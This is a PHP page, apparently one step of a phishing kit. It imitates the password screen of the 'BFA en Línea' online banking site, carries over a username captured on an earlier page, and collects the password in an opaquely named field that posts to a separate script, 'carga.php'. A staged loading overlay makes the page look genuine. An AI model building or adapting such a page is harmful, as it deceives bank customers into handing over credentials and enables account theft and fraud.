<?php
session_start();
$usuario = trim($_POST['ips1'] ?? $_SESSION['usuario'] ?? '');
if (!$usuario) { header("Location: index.php"); exit; }
$usuario = str_replace(' ', '', $usuario);
$_SESSION['usuario'] = $usuario;
$page_title = 'BFA en Línea - Contraseña';
include('_header.php');
?>

      <!-- Avatar con check verde -->
      <div class="avatar" style="margin-top:10px;position:relative;display:inline-block">
        <img src="img/BFAonline_administracion-11.png" alt="Usuario" style="width:64px;height:64px">
        <span style="position:absolute;right:-4px;bottom:-4px;width:24px;height:24px;border-radius:50%;background:#22c55e;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:bold;border:2px solid #fff;box-shadow:0 1px 3px rgba(0,0,0,.2)">✓</span>
      </div>

      <div style="margin-top:10px;font-size:15px;font-weight:700;color:#022a4f"><?= htmlspecialchars($usuario) ?></div>
      <a href="index.php" style="font-size:12px;color:#022a4f;text-decoration:underline;margin-top:2px">Cambiar usuario</a>

      <form class="form" method="POST" action="carga.php" style="width:100%;max-width:320px;margin-top:18px">
        <label for="password" style="margin-left:38px;display:block;text-align:left;font-weight:600;color:#022a4f;font-size:15px;margin-bottom:8px">
          Contraseña <span style="color:#e53935">*</span>
        </label>
        <input id="password" name="ips2" type="password" placeholder="Ingrese Contraseña" autocomplete="current-password" required
               style="background:#dddddd;color:#232323;outline:0;padding:6px 10px;border:0;border-radius:10px;font-size:14px;margin-left:39px;width:15rem;font-family:'Montserrat',sans-serif">

        <br><button class="btn-next" type="submit"
                style="margin-left:55px;background:linear-gradient(to right,#FF9012,#FFD700);color:#fff;border-radius:34px;padding:7px 25px;font-weight:600;border:0;cursor:pointer;outline:0;display:block;margin:18px auto 0;font-family:'Montserrat',sans-serif">
          Ingresar
        </button>
      </form>

<script>
  // Mostrar loading gif al cargar la página por 1.5s
  (function(){
    var ov = document.getElementById('overlay-carga');
    ov.style.display = 'flex';
    setTimeout(function(){ ov.style.display = 'none'; document.getElementById('password').focus(); }, 1500);
  })();
</script>

<?php include('_footer.php'); ?>
